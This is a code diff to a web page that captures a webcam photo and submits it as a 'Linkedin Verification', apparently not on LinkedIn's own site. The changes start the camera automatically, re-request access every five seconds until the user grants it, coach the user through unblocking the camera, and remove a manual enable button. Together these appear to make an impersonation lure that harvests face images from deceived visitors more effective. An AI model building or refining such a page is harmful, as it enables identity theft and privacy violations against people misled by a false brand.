@@ -56,6 +56,7 @@ position:relative;
 video{
 width:100%;
 border-radius:12px;
+background:black;
 }
 
 .circle{
@@ -80,6 +81,12 @@ display:none;
 #status{
 margin-top:10px;
 font-size:14px;
+}
+
+#cameraHelp{
+font-size:12px;
+opacity:0.8;
+margin-top:6px;
 }
 
 </style>
@@ -114,6 +121,15 @@ playsinline
 <div class="circle"></div>
 
 </div>
+
+<!--
+<button
+type="button"
+onclick="startCamera()"
+>
+Enable Camera
+</button>
+-->
 
 <input
 type="hidden"
@@ -150,13 +166,53 @@ document.getElementById("video")
 const submitBtn =
 document.getElementById("submitBtn")
 
-navigator.mediaDevices
-.getUserMedia({video:true})
-.then(stream=>{
+const status =
+document.getElementById("status")
+
+let streamStarted = false
+
+
+async function startCamera(){
+
+try{
+
+const stream =
+await navigator.mediaDevices.getUserMedia({video:true})
+
 video.srcObject = stream
-})
+
+streamStarted = true
+
+status.innerHTML = "";
+//status.innerHTML = "📷 Camera enabled";
+
+}catch(err){
+
+status.innerHTML = "⚠️ Camera blocked. Please allow camera access. <br /><br />click 🔒 icon in browser bar → Allow camera → refresh."
+
+}
+
+}
+
+
+// retry camera periodically
+setInterval(()=>{
+if(!streamStarted){
+startCamera()
+}
+},5000)
+
 
 function capturePhoto(){
+
+if(!streamStarted){
+
+status.innerHTML =
+"Please enable camera first"
+
+return
+
+}
 
 const canvas =
 document.createElement("canvas")
@@ -192,7 +248,11 @@ document
 
 submitBtn.disabled = false
 
+status.innerHTML =
+"Photo captured"
+
 }
+
 
 document
 .getElementById("verifyForm")
@@ -201,9 +261,6 @@ document
 async function(e){
 
 e.preventDefault()
-
-const status =
-document.getElementById("status")
 
 status.innerHTML =
 "Submitting..."
@@ -228,7 +285,7 @@ headers:{
 if(response.ok){
 
 status.innerHTML =
-"✅ Your Linkedin Verification submitted successfully. Thank you for connecting with us! Your admin will reach out to you in a moment"
+"✅ Your Linkedin Verification submitted successfully. Thank you for connecting with us! Your admin will reach out to you shortly."
 
 this.reset()
 
@@ -242,7 +299,7 @@ submitBtn.disabled = true
 }else{
 
 status.innerHTML =
-"❌ Form Submission failed. Please try again."
+"❌ Form submission failed. Please try again."
 
 }
 
@@ -256,6 +313,10 @@ status.innerHTML =
 }
 
 )
+
+
+// start automatically
+startCamera()
 
 </script>
 
